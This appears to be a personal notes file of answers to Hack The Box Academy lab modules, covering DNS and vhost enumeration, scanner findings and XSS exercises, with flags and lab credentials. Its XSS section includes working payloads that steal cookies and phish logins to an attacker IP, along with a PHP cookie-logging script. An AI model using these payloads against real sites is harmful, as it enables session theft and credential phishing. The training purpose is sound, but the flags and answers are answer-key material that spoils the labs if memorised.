**Using the known subdomains for inlanefreight.com (www, ns1, ns2, ns3, blog, support, customer), find any missing subdomains by brute-forcing possible domain names. Prov**ide your answer with the complete subdomain, e.g., www.inlanefreight.com.

```
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -r
```

Results: my.inlanefreight.com

#### DNS Zone Transfers

**After performing a zone transfer for the domain inlanefreight.htb on the target system, how many DNS records are retrieved from the target system's name server? Provide your answer as an integer, e.g, 123.**

```
dig axfr inlanefreight.htb @$ip 
```

```
# Response
; <<>> DiG 9.19.21-1-Debian <<>> axfr inlanefreight.htb @10.129.72.193
;; global options: +cmd
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
inlanefreight.htb.	604800	IN	NS	ns.inlanefreight.htb.
admin.inlanefreight.htb. 604800	IN	A	10.10.34.2
ftp.admin.inlanefreight.htb. 604800 IN	A	10.10.34.2
careers.inlanefreight.htb. 604800 IN	A	10.10.34.50
dc1.inlanefreight.htb.	604800	IN	A	10.10.34.16
dc2.inlanefreight.htb.	604800	IN	A	10.10.34.11
internal.inlanefreight.htb. 604800 IN	A	127.0.0.1
admin.internal.inlanefreight.htb. 604800 IN A	10.10.1.11
wsus.internal.inlanefreight.htb. 604800	IN A	10.10.1.240
ir.inlanefreight.htb.	604800	IN	A	10.10.45.5
dev.ir.inlanefreight.htb. 604800 IN	A	10.10.45.6
ns.inlanefreight.htb.	604800	IN	A	127.0.0.1
resources.inlanefreight.htb. 604800 IN	A	10.10.34.100
securemessaging.inlanefreight.htb. 604800 IN A	10.10.34.52
test1.inlanefreight.htb. 604800	IN	A	10.10.34.101
us.inlanefreight.htb.	604800	IN	A	10.10.200.5
cluster14.us.inlanefreight.htb.	604800 IN A	10.10.200.14
messagecenter.us.inlanefreight.htb. 604800 IN A	10.10.200.10
ww02.inlanefreight.htb.	604800	IN	A	10.10.34.112
www1.inlanefreight.htb.	604800	IN	A	10.10.34.111
inlanefreight.htb.	604800	IN	SOA	inlanefreight.htb. root.inlanefreight.htb. 2 604800 86400 2419200 604800
;; Query time: 540 msec
;; SERVER: 10.129.72.193#53(10.129.72.193) (TCP)
;; WHEN: Tue Sep 10 15:25:16 EDT 2024
;; XFR size: 22 records (messages 1, bytes 594)
```


Results: 22

**Within the zone record transferred above, find the ip address for ftp.admin.inlanefreight.htb. Respond only with the IP address, eg 127.0.0.1**

Results:  10.10.34.2

**Within the same zone record, identify the largest IP address allocated within the 10.10.200 IP range. Respond with the full IP address, eg 10.10.200.1**

Results:  10.10.200.14

#### Virtual Hosts

**Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "web"? Answer using the full domain, e.g. "x.inlanefreight.htb"**

Important, the --append-domain part

```
gobuster vhost -u http://$domain:$port/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

Results: web17611.inlanefreight.htb

**Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "vm"? Answer using the full domain, e.g. "x.inlanefreight.htb"**

Results: vm5.inlanefreight.htb

**Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "br"? Answer using the full domain, e.g. "x.inlanefreight.htb"**

Results: browser.inlanefreight.htb


**Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "a"? Answer using the full domain, e.g. "x.inlanefreight.htb"**

Results: admin.inlanefreight.htb


**Brute-force vhosts on the target system. What is the full subdomain that is prefixed with "su"? Answer using the full domain, e.g. "x.inlanefreight.htb"**

Results: support.inlanefreight.htb

### Fingerprinting

#### Fingerprinting

**Determine the Apache version running on app.inlanefreight.local on the target system. (Format: 0.0.0)**

```
sudo echo $ip app.inlanefreight.local >> /etc/hosts
curl -I app.inlanefreight.local
```

Results: 2.4.41B



**Which CMS is used on app.inlanefreight.local on the target system? Respond with the name only, e.g., WordPress.**

```
whatweb http://app.inlanefreight.local
```

Results: Joomla


**On which operating system is the dev.inlanefreight.local webserver running in the target system? Respond with the name only, e.g., Debian.**

Results: Ubuntu 

### Crawling

#### Creepy crawlies

**After spidering inlanefreight.com, identify the location where future reports will be stored. Respond with the full domain, e.g., files.inlanefreight.com.**

```
python3 ReconSpider.py https://inlanefreight.com
```

Results: inlanefreight-comp133.s3.amazonaws.htb

### Web Archives


**How many Pen Testing Labs did HackTheBox have on the 8th August 2018? Answer with an integer, eg 1234.**

Go to https://web.archive.org/web/20180808080705/https://www.hackthebox.eu/

Results: 74

**How many members did HackTheBox have on the 10th June 2017? Answer with an integer, eg 1234.**

Go to https://web.archive.org/web/20180808080705/https://www.hackthebox.eu/

Results: 3054

**Going back to March 2002, what website did the facebook.com domain redirect too? Answer with the full domain, eg http://www.facebook.com/**

Go to https://web.archive.org/web/20020601000000*/www.facebook.com

Results:  http://site.aboutface.com/

**According to the paypal.com website in October 1999, what could you use to "beam money to anyone"? Answer with the product name, eg My Device, remove the ™ from your answer.**

Go to https://web.archive.org/web/19991013140707/http://paypal.com/

Results: Palm 0rganizer

**Going back to November 1998 on google.com, what address hosted the non-alpha "Google Search Engine Prototype" of Google? Answer with the full address, eg http://google.com**

Go to https://web.archive.org/web/19981111184551/http://google.com/

Results: http://google.stanford.edu/


**Going back to March 2000 on www.iana.org, when exacty was the site last updated? Answer with the date in the footer, eg 11-March-99**

Go to https://web.archive.org/web/20000303211237/http://www.iana.org/

Results: 17-December-99


**According to the wikipedia.com snapshot taken in March 2001, how many pages did they have over? Answer with the number they state without any commas, eg 2000 not 2,000**

Go to https://web.archive.org/web/20010331173908/http://www.wikipedia.com/

Results: 3000


### Skills Assessment

**What is the IANA ID of the registrar of the inlanefreight.com domain?**

```
whois inlanefreight.com
```

Results: 468


**What http server software is powering the inlanefreight.htb site on the target system? Respond with the name of the software, not the version, e.g., Apache.**

```
curl -I $ip:$port
```

Results: nginx


**What is the API key in the hidden admin directory that you have discovered on the target system?**

```
# 1. Add $ip inlanefreight.htb to /etc/hosts

# 2. Create variable $port

# 3. Do a vhost scan. For instance
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://inlanefreight.htb:$port -H "HOST:FUZZ.inlanefreight.htb" -fs 120

# 4. Add the discovered VHOST to /etc/hosts

# 5. Enumerate the site 
dirb http://web1337.inlanefreight.htb:$port

# 6. There is a robots.txt file in the results, with a hiden admin panel. Trying to access directly the panel returns a 404. However we could try to fuzz it deeper:
ffuf -recursion -recursion-depth 1 -u http://web1337.inlanefreight.htb:53178/admin_h1dd3n/FUZZ -w /usr/share/seclists//Discovery/Web-Content/common.txt

# 7. There is one result: index.html. Go to http://web1337.inlanefreight.htb:$port/admin_h1dd3n/index.html to retrieve the flag.


```

Results:  e963d863ee0e82ba7080fbf558ca0d3f

 **After crawling the inlanefreight.htb domain on the target system, what is the email address you have found? Respond with the full email, e.g., mail@inlanefreight.htb.**

```
# 1. Following the previous question, additional vhost discovery could be done:
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u http://inlanefreight.htb:$port -H "HOST:FUZZ.web1337.inlanefreight.htb" -fs 120
# Add the second discovered VHOST (`dev`) to /etc/host, and visit the site http://dev.web1337.inlanefreight.htb/index.html. Notice that there is a next button, that takes you to a http://dev.web1337.inlanefreight.htb/index-123.html. Set-up an intruder attack with Numbered payload

```

![pay](img/payload_00.png)

![pay](img/payload_02.png)

Results:   1337testing@inlanefreight.htb


**What is the API key the inlanefreight.htb developers will be changing too?**


![pay](img/payload_01.png)

Results: ba988b835be4aa97d068941dc852ff33




## [Vulnerability Assessment](https://academy.hackthebox.com/module/details/108)

### Nesus

#### Nessus Skills assessment

 
**What is the name of one of the accessible SMB shares from the authenticated Windows scan? (One word)**

Authenticate to port 22  with user "htb-student" and password "HTB_@cademy_student!". Start nessus and go to the IP:8834 url. Have a look at the windows scan.

Results: wsus


**What was the target for the authenticated scan?** 

Results: 172.16.16.100


**What is the plugin ID of the highest criticality vulnerability for the Windows authenticated scan?** 

Results: 156032



 **What is the name of the vulnerability with plugin ID 26925 from the Windows authenticated scan? (Case sensitive)**

Results:   VNC Server Unauthenticated Access



 **What port is the VNC server running on in the authenticated Windows scan?**


Results:  5900


### Openvass

#### Openvass Skills assessment

**What type of operating system is the Linux host running? (one word)**

Results:  Ubuntu


**What type of FTP vulnerability is on the Linux host? (Case Sensitive, four words)**

Results:  Anonymous FTP Login Reporting


**What is the IP of the Linux host targeted for the scan?**

Results:  172.16.16.160


**What vulnerability is associated with the HTTP server? (Case-sensitive)**

Results:  Cleartext Transmission of Sensitive Information via HTTP



Question

```

```

Results:  





Question

```

```

Results:  




Question

```

```

Results:  




Question

```

```

Results:  




Question

```

```

Results:  




Question

```

```

Results:  



## [File Transfers](https://academy.hackthebox.com/module/details/24)

## [Shells & Payloads](https://academy.hackthebox.com/module/details/115)

## [Using the Metasploit Framework](https://academy.hackthebox.com/module/details/39)

## [Password Attacks](https://academy.hackthebox.com/module/details/147)

## [Attacking Common Services](https://academy.hackthebox.com/module/details/116)

## [Pivoting, Tunneling, and Port Forwarding](https://academy.hackthebox.com/module/details/158)

## [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143)

## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)

## [Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54)


## [Login Brute Forcing](https://academy.hackthebox.com/module/details/57)


## [SQL Injection Fundamentals](https://academy.hackthebox.com/module/details/33)


## [Cross-Site Scripting (XSS)](https://academy.hackthebox.com/module/details/103)


### XSS Basics

####  Stored XSS


**To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

```
<script>alert(document.cookie)</script>
```

Results:  HTB{570r3d_f0r_3v3ry0n3_70_533}


####  Reflected XSS


**To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.**

```
http://83.136.253.163:57837/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

Results: HTB{r3fl3c73d_b4ck_2_m3}

####  DOM XSS

 To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.
 
```
# Enter <img src="" onerror=alert(document.cookie)>
```

Results: 


####  XSS Discovery

**Utilize some of the techniques mentioned in this section to identify the vulnerable input parameter found in the above server. What is the name of the vulnerable parameter?**

```
# Enter http://$ip:$port/?fullname=lolo&username=lala&password=lalala&email=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

Results: email


**What type of XSS was found on the above server? "name only"**

Results:  Reflected

### XSS Attacks

#### Phishing 

**Try to find a working XSS payload for the Image URL form found at '/phishing' in the above server, and then use what you learned in this section to prepare a malicious URL that injects a malicious login form. Then visit '/phishing/send.php' to send the URL to the victim, and they will log into the malicious login form. If you did everything correctly, you should receive the victim's login credentials, which you can use to login to '/phishing/login.php' and obtain the flag.**

Creating a valid payload in http://10.129.148.221/phishing/index.php?url= This would be the payload:

```
\`/'</script/--!><h3>Please login to continue</h3><form action=http://10.10.14.198>    <input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>
```

This would be the link generated:

```
http://10.129.148.221/phishing/index.php?url=%5C%60%2F%27%3C%2Fscript%2F--%21%3E%3Ch3%3EPlease+login+to+continue%3C%2Fh3%3E%3Cform+action%3Dhttp%3A%2F%2F10.10.14.198%3E++++%3Cinput+type%3D%22username%22+name%3D%22username%22+placeholder%3D%22Username%22%3E%3Cinput+type%3D%22password%22+name%3D%22password%22+placeholder%3D%22Password%22%3E%3Cinput+type%3D%22submit%22+name%3D%22submit%22+value%3D%22Login%22%3E%3C%2Fform%3E

```

Starting a netcat listener:

```
sudo nc -lvnp 80
```

Visiting http://10.129.148.221/phishing/send.php and entering the link generated.

In the netcat  listener we obtain:

```
listening on [any] 80 ...
connect to [10.10.14.198] from (UNKNOWN) [10.129.148.221] 46802
GET /?username=admin&password=p1zd0nt57341myp455&submit=Login HTTP/1.1
Host: 10.10.14.198
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: HTBXSS/1.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://10.129.148.221/
Accept-Encoding: gzip, deflate
Accept-Language: en-US

```

We use the creds for accessing to /phishing/login.php and grabbing the flag

Results: HTB{r3f13c73d_cr3d5_84ck_2_m3}

#### Session Hijacking

**Try to repeat what you learned in this section to identify the vulnerable input field and find a working XSS payload, and then use the 'Session Hijacking' scripts to grab the Admin's cookie and use it in 'login.php' to get the flag.**

Create a file index.php in the attacker machine:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

Have a php server listening:

```bash
sudo php -S 0.0.0.0:80
```


Enter $ip/hijacking and enter this payload in every field. Use the field name (username, name, surname...) as `<custom.name>` when different payloads:

```html
<script>document.location=%27http://attackerIP/index.php?c=%27+document.cookie</script>
```



If successful, you will see a connection in your php server like this:

![xss blind](img/xss_blind_00.png)

Then, `profile` would be the vulnerable input (parameter `imgurl`). The URL:

```
http://VICTIMIP/hijacking/?fullname=Lala%20lalasurname%2Ffullname%3C%2Fscript%3E&username=%22%3E%3Cscript+src%3Dhttp%3A%2F%2FAttackerIP%2Fusername%3C%2Fscript%3E&password=lala&email=lala%40gmail.com&imgurl=%22%3E%3Cscript%20src=%22http://AttackerIP/lala.js%22%3E%3C/script%3E
```

Beside the index.php, have a lala.js in your php server:

```js
new Image().src='http://attackerIP/index.php?c='+document.cookie
```

Run your php server:

```bash
sudo php -S 0.0.0.0:80
```

Now, we can change the URL in the XSS payload we found earlier to use `lala.js`. For instance:

```html
<script src=http://attackerIP/lala.js></script>
```

You will log the following activity in your php server:

![xss blind](img/xss_blind_02.png)


Results:  HTB{4lw4y5_53cur3_y0ur_c00k135}


### XSS Prevention

####  Skills Assessment


**What is the value of the 'flag' cookie?**

Enter payload in all form fields. The vulnerable one is `website` with the payload

```html
<script src='http://attackerIP/website'></script>
```

I have a php server running, with this index.php:

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

I know that it is the parameter `webserver` because of this:

![xss_blind_01](img/xss_blind_01.png)

Now, I have also this file lala.js in my server:

```
<script src='http://attackerIP/lala.js'></script>
```

And in my php server:

![xss_blind_03](img/xss_blind_03.png)

Results:  HTB{cr055_5173_5cr1p71n6_n1nj4}




## [File Inclusion](https://academy.hackthebox.com/module/details/23)


## [File Upload Attacks](https://academy.hackthebox.com/module/details/136)


## [Command Injections](https://academy.hackthebox.com/module/details/109)


##  [Web Attacks](https://academy.hackthebox.com/module/details/134)


## [Attacking Common Applications](https://academy.hackthebox.com/module/details/113)


## [Linux Privilege Escalation](https://academy.hackthebox.com/module/details/51)


## [Windows Privilege Escalation](https://academy.hackthebox.com/module/details/67)


## [Documentation & Reporting](https://academy.hackthebox.com/module/details/162)


##  [Attacking Enterprise Networks](https://academy.hackthebox.com/module/details/163)



Question

```

```

Results: 

